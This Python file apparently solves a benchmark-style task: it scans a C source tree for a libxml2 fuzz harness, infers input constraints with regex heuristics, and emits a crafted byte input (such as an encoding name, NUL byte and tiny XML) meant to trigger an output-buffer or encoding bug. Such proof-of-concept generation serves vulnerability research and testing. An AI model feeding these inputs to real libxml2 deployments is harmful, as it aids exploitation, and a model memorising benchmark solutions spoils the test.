import os
import re
import tarfile
from typing import Dict, Iterable, List, Optional, Tuple


_TYPE_SIZE_MAP: Dict[str, int] = {
    "uint8_t": 1,
    "int8_t": 1,
    "unsigned char": 1,
    "char": 1,
    "uint16_t": 2,
    "int16_t": 2,
    "unsigned short": 2,
    "short": 2,
    "uint32_t": 4,
    "int32_t": 4,
    "unsigned int": 4,
    "int": 4,
    "uint64_t": 8,
    "int64_t": 8,
    "unsigned long long": 8,
    "long long": 8,
    "size_t": 8,
    "ssize_t": 8,
}


def _read_bytes_from_file(path: str, limit: int = 2_000_000) -> bytes:
    try:
        with open(path, "rb") as f:
            return f.read(limit)
    except Exception:
        return b""


def _read_text_from_bytes(b: bytes) -> str:
    if not b:
        return ""
    try:
        return b.decode("utf-8", errors="ignore")
    except Exception:
        try:
            return b.decode("latin-1", errors="ignore")
        except Exception:
            return ""


def _iter_source_texts(src_path: str) -> Iterable[Tuple[str, str]]:
    if os.path.isdir(src_path):
        for root, _, files in os.walk(src_path):
            for fn in files:
                lfn = fn.lower()
                if not (lfn.endswith(".c") or lfn.endswith(".cc") or lfn.endswith(".cpp") or lfn.endswith(".cxx") or lfn.endswith(".h") or lfn.endswith(".hpp")):
                    continue
                p = os.path.join(root, fn)
                b = _read_bytes_from_file(p)
                if b:
                    yield p, _read_text_from_bytes(b)
        return

    if os.path.isfile(src_path) and tarfile.is_tarfile(src_path):
        try:
            with tarfile.open(src_path, "r:*") as tf:
                for m in tf.getmembers():
                    if not m.isfile():
                        continue
                    name = m.name
                    lname = name.lower()
                    if not (lname.endswith(".c") or lname.endswith(".cc") or lname.endswith(".cpp") or lname.endswith(".cxx") or lname.endswith(".h") or lname.endswith(".hpp")):
                        continue
                    try:
                        f = tf.extractfile(m)
                        if f is None:
                            continue
                        b = f.read(2_000_000)
                    except Exception:
                        continue
                    if b:
                        yield name, _read_text_from_bytes(b)
        except Exception:
            return


def _score_fuzzer_source(text: str) -> int:
    if "LLVMFuzzerTestOneInput" not in text:
        return -1
    score = 0
    kw_weights = {
        "xmlAllocOutputBufferInternal": 100,
        "xmlAllocOutputBuffer": 40,
        "xmlOutputBufferCreate": 50,
        "xmlOutputBufferCreateIO": 50,
        "xmlOutputBufferWrite": 40,
        "xmlOutputBufferClose": 40,
        "xmlCharEncCloseFunc": 50,
        "xmlFindCharEncodingHandler": 40,
        "xmlOpenCharEncodingHandler": 40,
        "xmlDocDumpMemoryEnc": 30,
        "xmlDocDumpFormatMemoryEnc": 30,
        "xmlSaveFileEnc": 30,
        "xmlSaveToIO": 25,
        "xmlSaveDoc": 20,
        "xmlReadMemory": 15,
        "xmlCtxtReadMemory": 15,
        "xmlParseMemory": 10,
        "htmlReadMemory": 5,
        "FuzzedDataProvider": 10,
        "memchr": 8,
    }
    for kw, w in kw_weights.items():
        if kw in text:
            score += w
            score += min(10, text.count(kw))  # small extra weight for multiple occurrences
    return score


def _parse_int_literal(s: str) -> Optional[int]:
    s = s.strip()
    if not s:
        return None
    s = re.sub(r"[uUlL]+$", "", s)
    try:
        if s.startswith("0x") or s.startswith("0X"):
            return int(s, 16)
        return int(s, 10)
    except Exception:
        return None


def _parse_sizeof_expr(expr: str) -> Optional[int]:
    m = re.fullmatch(r"sizeof\s*\(\s*([^\)]+?)\s*\)", expr.strip())
    if not m:
        return None
    t = re.sub(r"\s+", " ", m.group(1).strip())
    if t in _TYPE_SIZE_MAP:
        return _TYPE_SIZE_MAP[t]
    t2 = t.replace("const ", "").replace("volatile ", "").strip()
    if t2 in _TYPE_SIZE_MAP:
        return _TYPE_SIZE_MAP[t2]
    t3 = t2.replace("unsigned ", "unsigned ").strip()
    if t3 in _TYPE_SIZE_MAP:
        return _TYPE_SIZE_MAP[t3]
    # Basic normalization for pointers: sizeof(char*) ~ sizeof(size_t) on 64-bit
    if "*" in t2:
        return _TYPE_SIZE_MAP.get("size_t", 8)
    return None


def _parse_const_expr(expr: str) -> Optional[int]:
    expr = expr.strip()
    if not expr:
        return None

    expr = expr.replace("(", " ").replace(")", " ")
    expr = re.sub(r"\s+", " ", expr).strip()

    s = _parse_sizeof_expr(expr)
    if s is not None:
        return s

    lit = _parse_int_literal(expr)
    if lit is not None:
        return lit

    m = re.fullmatch(r"(.+?)\s*([\+\-])\s*(.+)", expr)
    if m:
        a = _parse_const_expr(m.group(1))
        b = _parse_const_expr(m.group(3))
        if a is None or b is None:
            return None
        if m.group(2) == "+":
            return a + b
        else:
            return a - b

    m = re.fullmatch(r"(.+?)\s*\*\s*(.+)", expr)
    if m:
        a = _parse_const_expr(m.group(1))
        b = _parse_const_expr(m.group(2))
        if a is None or b is None:
            return None
        return a * b

    return None


def _extract_fuzzer_function_body(text: str) -> str:
    idx = text.find("LLVMFuzzerTestOneInput")
    if idx < 0:
        return text
    brace = text.find("{", idx)
    if brace < 0:
        return text[idx:]
    i = brace
    depth = 0
    while i < len(text):
        c = text[i]
        if c == "{":
            depth += 1
        elif c == "}":
            depth -= 1
            if depth == 0:
                return text[brace : i + 1]
        i += 1
    return text[brace:]


def _infer_min_size(text: str) -> int:
    body = _extract_fuzzer_function_body(text)
    min_size = 0

    # if (size < N) return;
    for m in re.finditer(r"if\s*\(\s*(?:size|Size)\s*(<|<=|==)\s*([^\)]+?)\s*\)\s*return\b", body):
        op = m.group(1)
        expr = m.group(2)
        val = _parse_const_expr(expr)
        if val is None:
            continue
        if op == "<":
            req = val
        elif op == "<=":
            req = val + 1
        else:  # ==
            req = val + 1
        if req > min_size:
            min_size = req

    # Sometimes: if (size < sizeof(...)) return;
    for m in re.finditer(r"if\s*\(\s*(?:size|Size)\s*<\s*(sizeof\s*\(\s*[^\)]+?\s*\))\s*\)\s*return\b", body):
        val = _parse_const_expr(m.group(1))
        if val is not None and val > min_size:
            min_size = val

    return min_size


def _infer_nul_split(text: str) -> bool:
    body = _extract_fuzzer_function_body(text)
    if re.search(r"memchr\s*\(\s*(?:data|Data)\s*,\s*(?:0|'\0')\s*,\s*(?:size|Size)\s*\)", body):
        return True
    if re.search(r"strchr\s*\(\s*\(const\s+char\s*\*\)\s*(?:data|Data)\s*,\s*'\\0'\s*\)", body):
        return True
    return False


def _infer_uses_xml_parse(text: str) -> bool:
    for kw in ("xmlReadMemory", "xmlCtxtReadMemory", "xmlParseMemory", "xmlParseDoc", "htmlReadMemory", "htmlCtxtReadMemory"):
        if kw in text:
            return True
    return False


def _infer_uses_output_buffer(text: str) -> bool:
    for kw in ("xmlOutputBuffer", "xmlDocDumpMemory", "xmlSave", "xmlTextWriter", "xmlAllocOutputBuffer"):
        if kw in text:
            return True
    return False


def _infer_has_constant_non_utf8_encoding(text: str) -> bool:
    body = _extract_fuzzer_function_body(text)

    # Look for explicit output encoding literals in likely output calls
    patterns = [
        r"\bxmlDocDumpMemoryEnc\s*\([^;]*\"([^\"]+)\"",
        r"\bxmlDocDumpFormatMemoryEnc\s*\([^;]*\"([^\"]+)\"",
        r"\bxmlSaveFileEnc\s*\([^;]*\"([^\"]+)\"",
        r"\bxmlSaveToIO\s*\([^;]*\"([^\"]+)\"",
        r"\bxmlSaveToBuffer\s*\([^;]*\"([^\"]+)\"",
        r"\bxmlSaveToFilename\s*\([^;]*\"([^\"]+)\"",
        r"\bxmlFindCharEncodingHandler\s*\(\s*\"([^\"]+)\"",
        r"\bxmlOpenCharEncodingHandler\s*\(\s*\"([^\"]+)\"",
    ]
    for pat in patterns:
        for m in re.finditer(pat, body):
            enc = m.group(1).strip().upper()
            if enc and enc != "UTF-8" and enc != "UTF8":
                return True
    return False


def _infer_data_offset_before_xml(text: str) -> int:
    body = _extract_fuzzer_function_body(text)
    parse_calls = [
        "xmlReadMemory",
        "xmlCtxtReadMemory",
        "xmlParseMemory",
        "xmlParseDoc",
        "htmlReadMemory",
        "htmlCtxtReadMemory",
    ]
    call_pos = None
    call_name = None
    for fn in parse_calls:
        p = body.find(fn)
        if p >= 0 and (call_pos is None or p < call_pos):
            call_pos = p
            call_name = fn
    if call_pos is None:
        return 0

    # Prefer direct data+N in call args
    call_slice = body[call_pos : min(len(body), call_pos + 400)]
    m = re.search(
        r"\b" + re.escape(call_name) + r"\s*\(\s*(?:\([^)]*\)\s*)?(?:const\s+char\s*\*\s*)?(?:data|Data)\s*\+\s*([0-9][0-9a-zA-ZxXuUlL]*)",
        call_slice,
    )
    if m:
        v = _parse_const_expr(m.group(1))
        if v is not None and 0 <= v <= 1_048_576:
            return v

    # Otherwise, sum constant increments to data before call
    prefix = body[:call_pos]
    total = 0
    for m in re.finditer(r"\b(?:data|Data)\s*\+=\s*([^;]+);", prefix):
        v = _parse_const_expr(m.group(1))
        if v is not None and 0 <= v <= 1_048_576:
            total += v
    for m in re.finditer(r"\b(?:data|Data)\s*=\s*(?:data|Data)\s*\+\s*([^;]+);", prefix):
        v = _parse_const_expr(m.group(1))
        if v is not None and 0 <= v <= 1_048_576:
            total += v
    if 0 <= total <= 1_048_576:
        return total
    return 0


def _pad_to_min_size(payload: bytes, min_size: int, pad_byte: bytes = b" ") -> bytes:
    if min_size <= 0:
        return payload
    if len(payload) >= min_size:
        return payload
    if not pad_byte or len(pad_byte) != 1:
        pad_byte = b" "
    return payload + pad_byte * (min_size - len(payload))


class Solution:
    def solve(self, src_path: str) -> bytes:
        best_score = -1
        best_text = ""
        best_path = ""

        for path, text in _iter_source_texts(src_path):
            if "LLVMFuzzerTestOneInput" not in text:
                continue
            sc = _score_fuzzer_source(text)
            if sc > best_score:
                best_score = sc
                best_text = text
                best_path = path

        xml_min = b"<a/>"
        xml_decl_iso = b'<?xml version="1.0" encoding="ISO-8859-1"?><a/>'
        enc = b"UTF-16"

        if best_score < 0 or not best_text:
            return xml_decl_iso

        nul_split = _infer_nul_split(best_text)
        uses_xml = _infer_uses_xml_parse(best_text)
        uses_out = _infer_uses_output_buffer(best_text)
        min_size = _infer_min_size(best_text)

        payload: bytes
        if nul_split:
            if uses_xml:
                payload = enc + b"\x00" + xml_min
            else:
                payload = enc + b"\x00" + b"A"
            payload = _pad_to_min_size(payload, max(min_size, 1), pad_byte=b" ")
            return payload

        # No NUL split
        if uses_xml:
            offset = _infer_data_offset_before_xml(best_text)
            if uses_out and _infer_has_constant_non_utf8_encoding(best_text):
                base = xml_min
            else:
                base = xml_decl_iso
            prefix = (b"\x00" * offset) if offset > 0 else b""
            payload = prefix + base
            payload = _pad_to_min_size(payload, max(min_size, 1), pad_byte=b" ")
            return payload

        if uses_out:
            payload = enc + b"\x00" + b"A"
            payload = _pad_to_min_size(payload, max(min_size, 1), pad_byte=b" ")
            return payload

        payload = xml_min
        payload = _pad_to_min_size(payload, max(min_size, 1), pad_byte=b" ")
        return payload